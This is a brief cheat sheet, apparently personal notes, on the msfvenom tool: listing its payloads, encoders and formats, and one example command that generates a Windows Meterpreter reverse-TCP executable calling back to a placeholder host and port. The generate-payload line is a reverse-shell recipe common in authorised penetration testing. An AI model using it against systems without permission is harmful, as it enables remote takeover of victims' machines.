# List stuff

<code> msfvenom -l \<type\>    </code>
<br> Where \<type\>: payloads, encoders, nops, platforms, archs, encrypt, formats, all


Example:
<code>  msfvenom -l payloads </code> 
  
# Generate payload
  
Example:
  
  <code> msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.xxx.xxx LPORT=xxx -f exe > meter.exe   </code>
